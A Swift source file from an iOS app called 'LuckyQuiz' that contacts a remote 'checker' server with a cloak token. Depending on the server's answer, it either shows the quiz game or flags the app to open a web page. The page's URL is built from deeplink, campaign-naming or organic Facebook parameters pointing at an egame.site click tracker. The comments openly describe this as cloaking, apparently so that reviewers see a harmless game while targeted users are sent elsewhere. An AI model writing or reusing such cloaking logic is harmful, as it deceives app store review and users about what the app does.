//
//  NewLogic.swift
//  LuckyQuiz
//
//  Created by Mark Vais on 11.11.2020.
//  Copyright © 2020 Mark Vais. All rights reserved.
//

import Foundation

class NewLogic {
    
    var media_sources = [MediaSources]()
    
    //MARK: - parse jsonData from checker api
    func getDataFromChecker (url: URL, completion: @escaping (Responce?) -> Void) {
        
        URLSession.shared.dataTask(with: url) { data, _, error in
            
            guard let jsonData = data else {
                print("Error getting jsonData")
                completion(nil)
                return
            }
            
            do {
                let decodedData = try JSONDecoder().decode(Responce.self, from: jsonData)
                completion(decodedData)
            }
            catch {
                print(error)
                completion(nil)
            }
        }.resume()
    }
    
    func checkerDataUsage(completion: @escaping ((user: String, source: String)) -> ()) {
        
        let url = URL(string: "https://integr-testing.site/checker/?token=\(Consts.CLOAK_TOKEN)")!
        //let url = URL(string: "https://integr-testing.site/apps_v2/checker/?bundle=com.gb.luckyquiz")!
        
        getDataFromChecker(url: url) { result in
            
            guard let res = result else {
                print("Cloak result is nil")
                return
            }
            
            let status = (res.user, res.source)
            
            let mediaSources = (res.media_sources)
            self.media_sources = mediaSources
            completion(status)
        }
    }
    
    //MARK: - deeplink/naming/organic logic
    
    func requestData() {
        
        // 1 - make cloak request
        checkerDataUsage() { [self] status in
            
            print("\nUser - \(status.user) \nSource - \(status.source)")
            
            // 2 - check user from cloak (true - show web, false - show game) // for game testing
            if status.user != "true" {
                UserDefaults.standard.set("false", forKey: "SHOW_WEB")
                print("\nUser not true - showing game")
                return
            }
            
            UserDefaults.standard.set("true", forKey: "SHOW_WEB")
            print("\nUser true - showing web")
            
            // 3 - user == "true" - check deeplink
            let deep = "\(UserDefaults.standard.object(forKey: "deeplink") ?? "")"
            
            DeeplinkParser().getDataFromDeeplink(deeplink: deep) { deeplinkData -> () in
                
                if deeplinkData != nil {
                    print("Deeplink data - \(deeplinkData!)")
                    formLinkFromResult(deeplinkData!, status)
                    return
                }
                
                // 4 - no deeplink - check naming
                NamingParser().getDataFromNaming(mediaSources: media_sources) { namingData -> () in
                    
                    if namingData != nil {
                        print("Naming data - \(namingData!)")
                        formLinkFromResult(namingData!, status)
                        return
                    }
                    
                    // 5 - no naming - create organic
                    var computedKey: String {
                        if status.source == TrafficSource.FACEBOOK.rawValue {
                            return Consts.ORGANIC_FB
                        } else {
                            return Consts.ORGANIC_INAPP
                        }
                    }
                    
                    var computedSub1: String {
                        if status.source == TrafficSource.FACEBOOK.rawValue {
                            return "organic_fb"
                        } else {
                            return "organic_inapp"
                        }
                    }
                    
                    let organicData = ResultData(key: computedKey, sub1: computedSub1, source: TrafficSource.FACEBOOK)
                    print("Organic data - \(organicData)")
                    formLinkFromResult(organicData, status)
                }
            }
        }
    }
    
    func formLinkFromResult(_ data: ResultData, _ status: (String , String)) {
        
        // create link from passed params
        var link = "https://egame.site/click.php"
        
        // neccessary params
        let key = data.key
        link.append("?key=\(key)")
        print(link)
        
        let sub1 = data.sub1
        link.append("&sub1=\(sub1)")
        print(link)
        
        // optional params
        if data.sub2 != nil && data.sub2 != "" {
            let sub2 = data.sub2
            link.append("&sub2=\(sub2!)")
            print(link)
        }
        
        if data.sub3 != nil && data.sub3 != "" {
            let sub3 = data.sub3
            link.append("&sub3=\(sub3!)")
            print(link)
        }
        
        let urlToShow = link
        UserDefaults.standard.set(urlToShow, forKey: "AGREEMENT_URL")
    }
}
